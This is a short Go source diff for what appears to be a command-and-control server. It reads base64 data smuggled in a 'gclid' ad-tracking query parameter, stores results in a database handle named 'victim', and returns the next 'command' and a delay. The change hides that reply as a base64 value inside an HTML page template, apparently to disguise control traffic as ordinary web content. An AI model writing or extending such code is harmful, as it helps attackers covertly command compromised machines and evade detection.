@@ -16,6 +16,10 @@ var victim *sql.DB
 var logs *sql.DB
 var err error
 
+type ValueResponse struct {
+  All string
+}
+
 func saveResponse(x []byte) bool{
 	value := strings.Split(string(x), "==")
 	fmt.Print("Valor: %s\n", value)
@@ -57,8 +61,6 @@ func pageAPI(w http.ResponseWriter, r *http.Request) {
 func proccessData(w http.ResponseWriter, r *http.Request) {
   var command string // Command to running
   var number int // If is new sending id or if was recorded send time delay to next request
-	tmpl := template.Must(template.ParseFiles(os.Args[1]))
-	tmpl.Execute(w, nil)
 	value, err := base64.StdEncoding.DecodeString(string(r.URL.Query()["gclid"][0]))
 	errorStatment(err)
 
@@ -71,8 +73,12 @@ func proccessData(w http.ResponseWriter, r *http.Request) {
     command = queryCommand(value)
     number = 0
   }
+  // command==number(delay or uid)
+  all := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s==%v", command, number)))
 
-	fmt.Fprintf(w, "Donate\t%s==%v", command, number)
+  response := ValueResponse{All: all}
+	tmpl := template.Must(template.ParseFiles(os.Args[1]))
+	tmpl.Execute(w, response)
  }
 
 func main() {
